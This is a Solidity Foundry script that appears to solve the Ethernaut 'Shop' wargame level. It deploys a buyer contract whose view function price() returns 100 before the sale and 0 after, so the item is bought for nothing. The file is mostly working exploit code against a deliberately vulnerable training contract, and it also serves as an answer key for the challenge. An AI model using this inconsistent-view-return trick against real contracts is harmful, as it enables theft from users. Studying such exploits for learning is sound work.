// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Shop.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

/*
    Сan you get the item from the shop for less than the price asked?

    Things that might help:
    Shop expects to be used from a Buyer
    Understanding restrictions of view functions
 */

contract ShopBuyer {

    Shop shop;
    constructor (Shop _shop) {
        shop = _shop;
    }

    /*
        The Shop contract calls price() twice
        Once in the if statement to make sure price >= 100
        Then again to set the Shop price
        So we change the price after the if statement is passed
     */
    function price() external view returns(uint256) {
        if (!shop.isSold()) {
            return 100;
        }
        return 0;
    }

    function buy() external {
        shop.buy();
        require(shop.price() == 0);
    }
}

contract ShopSolution is Script {

    Shop shop = Shop(0x9D5fD01302517b0B92b738bDc3a122a47397B7CC);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        ShopBuyer buyer = new ShopBuyer(shop);
        buyer.buy();
        vm.stopBroadcast();
        assert(shop.price() == 0);
    }
}